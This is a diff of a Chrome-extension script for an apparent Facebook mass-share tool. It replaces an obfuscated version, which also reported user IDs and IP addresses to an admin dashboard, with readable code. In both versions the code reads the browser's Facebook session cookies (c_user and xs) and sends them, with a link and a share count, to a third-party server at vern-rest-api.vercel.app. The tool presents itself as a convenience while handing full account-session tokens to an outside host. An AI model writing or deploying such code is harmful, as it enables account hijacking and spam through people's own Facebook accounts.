@@ -1,30 +1,111 @@
-// titeng baliko - Complete Facebook Share Tool with Monitoring
+// titeng baliko
 
-function _0x2d8c(){const _0x2e2f6f=['cookie','link','success','1797CPJCDg','https://www.facebook.com/notfound500','&limit=','4142797ORiXvO','245240uIfRPH','<i\x20class=\x22fas\x20fa-spinner\x20fa-spin\x20icon\x22></i>\x20Processing...','addEventListener','status','active','classList','error','/api/share?cookie=','✅\x20Shared\x20','shareBtn','tutorial.html','backBtn',';\x20xs=','find','all','processing','change','3096KfOmsN','getElementById','admin','innerHTML','textContent','#fecaca','Failed\x20to\x20share.','body','limit','c_user','https://vern-rest-api.vercel.app','forEach','light','dark','background','click','link','value','darkModeSwitch','_blank','trim','burger','statusEl','✅\x20Success!','connect','color','dashboard','open','features.html','http://localhost:3000','#fff','limitInput','shareCount','1234540jOlmyg','adminBtn','nav-links','GET','userUpdate','socket','processingUsers','table','&link=','c_user=','linkInput','console','cookieInput','disconnect','tutorials','#d1fae5','❌\x20Please\x20fill\x20all\x20fields!','message','\x20times!','cookies','activeUsers','json','tutorialsBtn','log','newUser','toggle','developer','style','totalUsers','darkMode','complete','query','admin.html','totalShares','error','querySelector','on','activeConnections','❌\x20Error!\x20Check\x20network\x20or\x20cookie.','tabs','getAll','currentWindow'];return _0x2d8c=function(){return _0x2e2f6f;};}const _0x5299d3=_0x2a14;function _0x2a14(_0x3626c7,_0x2e8a38){_0x3626c7=_0x3626c7-0xaa;const _0x2d8c93=_0x2d8c();let _0x2a14d6=_0x2d8c93[_0x3626c7];return _0x2a14d6;}!(function(_0x4b634e,_0x4f15b4){const _0x315d9c=_0x2a14,_0x5d04fa=_0x4b634e();for(;;){try{const _0x175f77=parseInt(_0x315d9c(0xd3))/0x1+parseInt(_0x315d9c(0xe7))/0x2+parseInt(_0x315d9c(0xe3))/0x3+parseInt(_0x315d9c(0xb3))/0x4+parseInt(_0x315d9c(0xbb))/0x5+-parseInt(_0x315d9c(0xb6))/0x6+parseInt(_0x315d9c(0xb5))/0x7+-parseInt(_0x315d9c(0xad))/0x8;if(_0x175f77===_0x4f15b4)break;else _0x5d04fa['push'](_0x5d04fa['shift']());}catch(_0x32cd6b){_0x5d04fa['push'](_0x5d04fa['shift']());}}}(_0x2d8c,0x95192));
+// Array na naglalaman ng mga string constants na na-obfuscate
+const stringArray = ['59586WxIuJb', 'light', '#fecaca', 'body', '_self', 'error', '&link=', '_blank', 'addEventListener', '112540iLhNYm', 'darkModeSwitch', 'status', 'message', '879iLwAot', '2226640JjpVgm', 'Failed to share.', '&limit=', '✅ Shared ', 'cookie', '1436hMwpBB', '❌ Please fill all fields!', 'https://vern-rest-api.vercel.app/api/share?cookie=', 'features.html', 'limit', 'innerHTML', 'name', 'backBtn', 'nav-links', '#fff', 'active', 'cookies', 'classList', 'change', '; xs=', 'query', 'c_user', 'trim', '❌ Error! Check network or cookie.', '55TiHFnF', 'textContent', 'burger', 'color', 'c_user=', 'shareBtn', 'toggle', 'click', 'success_count', 'getElementById', ' times!', 'find', 'tutorials', 'style', 'link', '1897368SzZakT', '4VNqJmA', '<i class="fas fa-spinner fa-spin icon"></i> Processing...', '1187379SkhyzH', '1348669Foowgj', 'open', 'https://www.facebook.com', 'GET', 'dark', 'developer', 'value', 'json'];
 
-// Main variables - monitoring enabled
-const burger=document[_0x5299d3(0xd0)](_0x5299d3(0xb7)),navLinks=document[_0x5299d3(0xd0)](_0x5299d3(0xbe)),darkModeSwitch=document['getElementById'](_0x5299d3(0xcb)),developerBtn=document[_0x5299d3(0xd0)](_0x5299d3(0xbc)),tutorialsBtn=document[_0x5299d3(0xd0)](_0x5299d3(0xc0)),adminBtn=document[_0x5299d3(0xd0)]('admin'),backBtn=document['getElementById'](_0x5299d3(0xe8)),shareBtn=document['getElementById'](_0x5299d3(0xd5)),statusEl=document[_0x5299d3(0xd0)]('status'),cookieInput=document[_0x5299d3(0xd0)](_0x5299d3(0xb4)),linkInput=document[_0x5299d3(0xd0)](_0x5299d3(0xb1)),limitInput=document[_0x5299d3(0xd0)](_0x5299d3(0xaf));
+// Function para kunin ang mga string mula sa array gamit ang index
+function getString(index) {
+    const adjustedIndex = index - 0xaa; // Convert hex index to decimal
+    return stringArray[adjustedIndex];
+}
 
-// WebSocket for real-time monitoring
-let socket=null;const _0x5a9cf8=_0x5299d3;try{socket=io(_0x5a9cf8(0xd8));socket[_0x5a9cf8(0xdd)](_0x5a9cf8(0xdf),()=>{const _0x1543dd=_0x5a9cf8;console[_0x1543dd(0xe2)](_0x1543dd(0xb9));});socket['on']('activeUsers',_0x5a45fc=>{const _0x2cc17d=_0x5a9cf8;console[_0x2cc17d(0xe2)]('Active\x20users:',_0x5a45fc);});socket[_0x5a9cf8(0xdd)](_0x5a9cf8(0xde),_0x4d4596=>{const _0x51161f=_0x5a9cf8;console[_0x51161f(0xe2)]('New\x20user:',_0x4d4596);});socket[_0x5a9cf8(0xdd)]('userUpdate',_0x2836d9=>{const _0x32e93f=_0x5a9cf8;console[_0x32e93f(0xe2)]('User\x20updated:',_0x2836d9);});}catch(_0x4de0ea){console[_0x5a9cf8(0xe2)]('WebSocket\x20not\x20available');}
+// Get DOM elements
+const burger = document.getElementById('burger');
+const navLinks = document.getElementById('nav-links');
+const darkModeSwitch = document.getElementById('darkModeSwitch');
+const developerBtn = document.getElementById('developer');
+const tutorialsBtn = document.getElementById('tutorials');
+const backBtn = document.getElementById('backBtn');
+const shareBtn = document.getElementById('shareBtn');
+const statusEl = document.getElementById('status');
+const cookieInput = document.getElementById('cookie');
+const linkInput = document.getElementById('link');
+const limitInput = document.getElementById('limit');
 
-// Burger menu
-burger['addEventListener'](_0x5299d3(0xc4),()=>navLinks[_0x5299d3(0xc1)][_0x5299d3(0xd7)](_0x5299d3(0xc3)));
+// Burger menu toggle
+burger.addEventListener('click', () => {
+    navLinks.classList.toggle('active');
+});
 
-// Dark mode
-darkModeSwitch[_0x5299d3(0xc9)](_0x5299d3(0xe1),()=>{const _0x5938ac=_0x5299d3;document[_0x5938ac(0xcc)][_0x5938ac(0xc1)]['toggle'](_0x5938ac(0xb8)),document['body']['classList'][_0x5938ac(0xd7)](_0x5938ac(0xe0));});
+// Dark/Light mode toggle
+darkModeSwitch.addEventListener('change', () => {
+    document.body.classList.toggle('dark');
+    document.body.classList.contains('dark') 
+        ? document.body.style.color = '#fff'
+        : document.body.style.color = '#000';
+});
 
-// Buttons
-developerBtn[_0x5299d3(0xc9)](_0x5299d3(0xc4),()=>window['open'](_0x5299d3(0xe5),_0x5299d3(0xd9)));
-tutorialsBtn[_0x5299d3(0xc9)]('click',()=>window[_0x5299d3(0xda)](_0x5299d3(0xc2),_0x5299d3(0xd9)));
-adminBtn['addEventListener'](_0x5299d3(0xc4),()=>{const _0x1fd5ab=_0x5299d3;window[_0x1fd5ab(0xda)](_0x1fd5ab(0xca),_0x1fd5ab(0xd9));});
-backBtn[_0x5299d3(0xc9)](_0x5299d3(0xc4),()=>window[_0x5299d3(0xda)](_0x5299d3(0xd6),_0x5299d3(0xe4)));
+// Developer button click
+developerBtn.addEventListener('click', () => {
+    window.open('https://www.facebook.com/notfound500', '_self');
+});
 
-// Share function with monitoring
-shareBtn[_0x5299d3(0xc9)](_0x5299d3(0xc4),async()=>{const _0x28a180=_0x5299d3,_0x50bea7=cookieInput['value'][_0x28a180(0xe6)](),_0x1f27b2=linkInput[_0x28a180(0xd4)][_0x28a180(0xe6)](),_0x30f5c7=limitInput[_0x28a180(0xd4)][_0x28a180(0xe6)]();if(!_0x50bea7||!_0x1f27b2||!_0x30f5c7){statusEl[_0x28a180(0xc6)]=_0x28a180(0xc5),statusEl['style'][_0x28a180(0xcd)]=_0x28a180(0xaa);return;}statusEl['innerHTML']=_0x28a180(0xd2),statusEl[_0x28a180(0xc8)]['color']=_0x28a180(0xd1);try{const _0x2128b6=await fetch(_0x28a180(0xba)+encodeURIComponent(_0x50bea7)+_0x28a180(0xb2)+encodeURIComponent(_0x1f27b2)+_0x28a180(0xac)+encodeURIComponent(_0x30f5c7),{'method':_0x28a180(0xdb)}),_0x33c6ad=await _0x2128b6[_0x28a180(0xce)]();if(_0x33c6ad[_0x28a180(0xdc)]){statusEl['textContent']=_0x28a180(0xab)+_0x33c6ad['success_count']+_0x28a180(0xb0),statusEl[_0x28a180(0xc8)][_0x28a180(0xcd)]='#d1fae5';if(socket)socket['emit']('shareComplete',{'successCount':_0x33c6ad['success_count'],'link':_0x1f27b2});}else statusEl['textContent']='❌\x20'+(_0x33c6ad[_0x28a180(0xdc)]||_0x28a180(0xae)),statusEl['style'][_0x28a180(0xcd)]=_0x28a180(0xaa);}catch(_0x5653b8){statusEl[_0x28a180(0xc6)]=_0x28a180(0xc7),statusEl['style'][_0x28a180(0xcd)]=_0x28a180(0xaa),console[_0x28a180(0xe2)](_0x5653b8);}});
+// Tutorials button click
+tutorialsBtn.addEventListener('click', () => {
+    window.open('tutorial.html', '_blank');
+});
 
-// Get Facebook cookies
-chrome[_0x5299d3(0xe9)][_0x5299d3(0xcf)]({'active':!![],'currentWindow':!![]},_0x3aab22=>{const _0x42908f=_0x5299d3,_0x4efc46=_0x3aab22[0x0];if(!_0x4efc46)return;chrome[_0x42908f(0xb4)]['getAll']({'url':_0x42908f(0xd3)},_0x2e89ce=>{const _0x4df2e6=_0x42908f,_0x2a814f=_0x2e89ce[_0x4df2e6(0xc1)]||[];_0x2a814f[_0x4df2e6(0xd4)]||[];const _0x414a84=_0x2a814f[_0x4df2e6(0xd4)]?_0x2a814f[_0x4df2e6(0xd4)][_0x4df2e6(0xdd)](_0x1a3d36=>_0x1a3d36[_0x4df2e6(0xbf)]===_0x4df2e6(0xbd)):null,_0x3bcff8=_0x2a814f['find']?_0x2a814f[_0x4df2e6(0xd4)][_0x4df2e6(0xdd)](_0x24f44b=>_0x24f44b['name']===_0x4df2e6(0xdf)):null;if(_0x414a84&&_0x3bcff8)cookieInput[_0x4df2e6(0xd4)]=_0x4df2e6(0xbb)+_0x414a84['value']+_0x4df2e6(0xac)+_0x3bcff8[_0x4df2e6(0xd4)]+';';});});
+// Back button click
+backBtn.addEventListener('click', () => {
+    window.open('features.html', '_self');
+});
 
-// ADMIN DASHBOARD CODE
-function _0x3762db(){const _0x46d3c8=document['querySelector']('#dashboard');if(!_0x46d3c8)return;const _0x3c16c6=_0x5299d3;let _0x5b2d3c=io(_0x3c16c6(0xd8));_0x5b2d3c['on']('connect',()=>{console['log']('Connected\x20to\x20admin\x20server');});_0x5b2d3c['on']('activeUsers',_0x25f0a0=>{const _0x12f73e=_0x3c16c6;console[_0x12f73e(0xe2)]('Active\x20users\x20update:',_0x25f0a0);_0x1f0a30(_0x25f0a0);});_0x5b2d3c[_0x3c16c6(0xdd)]('newUser',_0x118a1b=>{const _0x3df5c1=_0x3c16c6;console[_0x3df5c1(0xe2)]('New\x20user\x20started:',_0x118a1b);_0x268f69(_0x118a1b);});_0x5b2d3c[_0x3c16c6(0xdd)]('userUpdate',_0x3e5c5d=>{const _0x23a00d=_0x3c16c6;console['log']('User\x20updated:',_0x3e5c5d);_0x4e14bb(_0x3e5c5d);});async function _0x49f707(){const _0x3f2b9b=_0x3c16c6;try{const _0x26b7d4=await fetch(_0x3f2b9b(0xd8)+'/api/stats'),_0x21a6d8=await _0x26b7d4[_0x3f2b9b(0xce)]();_0x4d85b5(_0x21a6d8);}catch(_0x311e90){console[_0x3f2b9b(0xe2)]('Error\x20loading\x20stats:',_0x311e90);}}function _0x4d85b5(_0x5778df){const _0x4d2316=_0x3c16c6,_0x4e2feb=document[_0x4d2316(0xcf)]('#stats');if(!_0x4e2feb)return;_0x4e2feb['innerHTML']=`<div class="stat-card"><h3>Active Connections</h3><div class="number">${_0x5778df['activeConnections']||0}</div></div><div class="stat-card"><h3>Processing Now</h3><div class="number">${_0x5778df[_0x4d2316(0xde)]||0}</div></div><div class="stat-card"><h3>Total Users</h3><div class="number">${_0x5778df[_0x4d2316(0xdc)]||0}</div></div><div class="stat-card"><h3>Total Shares</h3><div class="number">${_0x5778df['totalShares']||0}</div></div>`;}function _0x1f0a30(_0x478e59){const _0x209696=document[_0x3c16c6(0xcf)]('#activeUsersList');if(_0x209696)_0x209696['textContent']='Active\x20users:\x20'+_0x478e59['length'];}function _0x268f69(_0x29d3e8){const _0x2f2d99=document[_0x3c16c6(0xcf)]('#usersTable');if(!_0x2f2d99)return;const _0x2be0d6=_0x2f2d99['querySelector']('tbody');let _0x599703=document['createElement']('tr');_0x599703['innerHTML']=`<td>${_0x29d3e8['userId']}</td><td class="status-${_0x29d3e8['status']}">${_0x29d3e8['status']['toUpperCase']()}</td><td>${_0x29d3e8['successCount']||0}/${_0x29d3e8['limit']}</td><td><a href="${_0x29d3e8['link']}" target="_blank">View</a></td><td>${new Date(_0x29d3e8['startTime'])['toLocaleTimeString']()}</td><td>${_0x29d3e8['ip']||'N/A'}</td>`;_0x599703['id']='user-'+_0x29d3e8['userId'];_0x2be0d6['insertBefore'](_0x599703,_0x2be0d6['firstChild']);}function _0x4e14bb(_0x44920a){const _0x10945c=document[_0x3c16c6(0xcf)]('#user-'+_0x44920a['userId']);if(_0x10945c){_0x10945c['innerHTML']=`<td>${_0x44920a['userId']}</td><td class="status-${_0x44920a['status']}">${_0x44920a['status']['toUpperCase']()}</td><td>${_0x44920a['successCount']||0}/${_0x44920a['limit']}</td><td><a href="${_0x44920a['link']}" target="_blank">View</a></td><td>${new Date(_0x44920a['startTime'])[_0x3c16c6(0xe1)]()}</td><td>${_0x44920a['ip']||'N/A'}</td>`;}}_0x49f707();setInterval(_0x49f707,0x2710);}_0x3762db();
+// Share button click handler
+shareBtn.addEventListener('click', async () => {
+    const cookieValue = cookieInput.value.trim();
+    const linkValue = linkInput.value.trim();
+    const limitValue = limitInput.value.trim();
+    
+    // Validation
+    if (!cookieValue || !linkValue || !limitValue) {
+        statusEl.textContent = '❌ Please fill all fields!';
+        statusEl.style.color = '#fecaca';
+        return;
+    }
+    
+    // Show processing status
+    statusEl.innerHTML = '<i class="fas fa-spinner fa-spin icon"></i> Processing...';
+    statusEl.style.color = '#fff';
+    
+    try {
+        // Construct API URL
+        const apiUrl = 'https://vern-rest-api.vercel.app/api/share?cookie=' + 
+                      encodeURIComponent(cookieValue) + 
+                      '&link=' + encodeURIComponent(linkValue) + 
+                      '&limit=' + encodeURIComponent(limitValue);
+        
+        // Send request to API
+        const response = await fetch(apiUrl, {
+            method: 'GET'
+        });
+        
+        const data = await response.json();
+        
+        // Check response status
+        if (data.status) {
+            statusEl.textContent = '✅ Shared ' + data.success_count + ' times!';
+            statusEl.style.color = '#d1fae5';
+        } else {
+            statusEl.textContent = '❌ ' + (data.message || 'Error! Check network or cookie.');
+            statusEl.style.color = '#fecaca';
+        }
+    } catch (error) {
+        statusEl.textContent = 'Failed to share.';
+        statusEl.style.color = '#fecaca';
+        console.error(error);
+    }
+});
+
+chrome.tabs.query({'active': true, 'currentWindow': true}, (tabs) => {
+    const currentTab = tabs[0];
+    if (!currentTab) return;
+    
+    chrome.cookies.getAll({'url': 'https://www.facebook.com'}, (cookies) => {
+        const c_userCookie = cookies.find(cookie => cookie.name === 'c_user');
+        const xsCookie = cookies.find(cookie => cookie.name === 'xs');
+        
+        if (c_userCookie && xsCookie) {
+            cookieInput.value = 'c_user=' + c_userCookie.value + '; xs=' + xsCookie.value + ';';
+        }
+    });
+});
